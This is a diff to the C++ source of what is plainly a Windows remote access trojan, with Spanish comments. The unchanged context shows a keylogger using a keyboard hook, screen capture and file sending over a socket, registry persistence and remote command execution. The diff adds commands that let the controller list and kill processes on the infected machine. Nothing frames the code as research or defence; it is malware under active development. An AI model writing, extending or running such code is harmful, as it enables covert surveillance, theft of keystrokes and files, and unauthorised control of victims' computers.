@@ -8,11 +8,12 @@
 #include <fstream>  
 #include <vector>   
 #include <gdiplus.h> 
+#include <tlhelp32.h> // Necesario para el Pack de Herramientas (Procesos)
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "gdiplus.lib") 
-#pragma comment(lib, "gdi32.lib")   
+#pragma comment(lib, "gdi32.lib")    
 
 using namespace Gdiplus; 
 
@@ -29,7 +30,38 @@ std::string obtenerInfoSistema() {
     return std::string(pcName) + "|" + std::string(userName);
 }
 
-// --- 2. FUNCIÓN PARA ENVIAR ARCHIVOS ---
+// --- 2. GESTIÓN DE PROCESOS (SYSTEM TOOLS) ---
+std::string listarProcesos() {
+    std::string resultado = "--- PROCESOS ---\n";
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return "Error al obtener Snapshot.\n";
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            // Formato que el Dashboard espera: PID:Nombre|
+            resultado += std::to_string(pe32.th32ProcessID) + ":" + pe32.szExeFile + "|";
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+    return resultado;
+}
+
+std::string matarProceso(int pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (hProcess == NULL) return "ERROR: Acceso denegado o proceso inexistente.\n";
+
+    if (TerminateProcess(hProcess, 0)) {
+        CloseHandle(hProcess);
+        return "SUCCESS: Proceso " + std::to_string(pid) + " terminado.\n";
+    }
+    CloseHandle(hProcess);
+    return "ERROR: No se pudo terminar el proceso.\n";
+}
+
+// --- 3. FUNCIÓN PARA ENVIAR ARCHIVOS ---
 void enviarArchivo(SOCKET sock, std::string ruta) {
     std::ifstream file(ruta, std::ios::binary | std::ios::ate);
     if (!file.is_open()) {
@@ -43,7 +75,7 @@ void enviarArchivo(SOCKET sock, std::string ruta) {
     std::string header = "FILE_SIZE:" + std::to_string(size);
     send(sock, header.c_str(), (int)header.length(), 0);
     
-    Sleep(300); // Pausa para sincronización con Python
+    Sleep(300); 
 
     std::vector<char> buffer(size);
     if (file.read(buffer.data(), size)) {
@@ -52,7 +84,7 @@ void enviarArchivo(SOCKET sock, std::string ruta) {
     file.close();
 }
 
-// --- 3. FUNCIONES PARA CAPTURA DE PANTALLA ---
+// --- 4. FUNCIONES PARA CAPTURA DE PANTALLA ---
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     UINT num = 0, size = 0;
     GetImageEncodersSize(&num, &size);
@@ -77,9 +109,7 @@ void capturarPantalla(SOCKET sock) {
 
     std::string rutaImg = std::string(getenv("TEMP")) + "\\scr.jpg";
 
-    {   // --- BLOQUE DE SEGURIDAD {} ---
-        // Al encerrar esto en llaves, obligamos a que 'bitmap' se destruya 
-        // y libere el archivo scr.jpg ANTES de intentar enviarlo.
+    {   
         int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
         int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
         int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
@@ -104,13 +134,11 @@ void capturarPantalla(SOCKET sock) {
     } 
 
     GdiplusShutdown(gdiplusToken);
-
-    // Ahora el archivo está libre y podemos enviarlo/borrarlo sin errores
     enviarArchivo(sock, rutaImg);
     DeleteFileA(rutaImg.c_str());
 }
 
-// --- 4. KEYLOGGER ---
+// --- 5. KEYLOGGER ---
 LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
@@ -132,7 +160,7 @@ void IniciarKeylogger() {
     UnhookWindowsHookEx(hhkLowLevelKybd);
 }
 
-// --- 5. PERSISTENCIA Y RCE ---
+// --- 6. PERSISTENCIA Y RCE ---
 void instalarPersistencia() {
     char rutaPropia[MAX_PATH];
     GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
@@ -153,7 +181,7 @@ std::string ejecutarComando(const char* cmd) {
     return resultado;
 }
 
-// --- 6. MAIN ---
+// --- 7. MAIN (BUCLE DE COMANDOS ACTUALIZADO) ---
 int main() {
     instalarPersistencia();
     std::thread(IniciarKeylogger).detach(); 
@@ -187,6 +215,20 @@ int main() {
         } 
         else if (comando == "screenshot") {
             capturarPantalla(sock);
+        }
+        else if (comando == "ps") {
+            std::string lista = listarProcesos();
+            send(sock, lista.c_str(), (int)lista.length(), 0);
+        }
+        else if (comando.find("kill ") == 0) {
+            try {
+                int pid = std::stoi(comando.substr(5));
+                std::string res = matarProceso(pid);
+                send(sock, res.c_str(), (int)res.length(), 0);
+            } catch (...) {
+                std::string err = "ERROR: PID invalido.\n";
+                send(sock, err.c_str(), (int)err.length(), 0);
+            }
         }
         else if (comando.find("download ") == 0) {
             enviarArchivo(sock, comando.substr(9));
